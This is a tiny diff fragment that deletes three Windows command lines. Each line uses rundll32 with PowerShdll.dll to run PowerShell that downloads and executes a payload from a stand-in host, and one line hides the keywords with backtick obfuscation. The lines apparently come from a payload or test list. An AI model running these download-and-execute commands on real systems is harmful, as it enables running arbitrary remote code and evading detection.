@@ -1,3 +1,0 @@
-rundll32.exe PowerShdll.dll,main -c "I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')"
-rundll32.exe PowerShdll.dll,main -c "IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')"
-rundll32.exe PowerShdll.dll,main -c "Invoke-RestMethod -Uri http://example.com/payload | IEX"
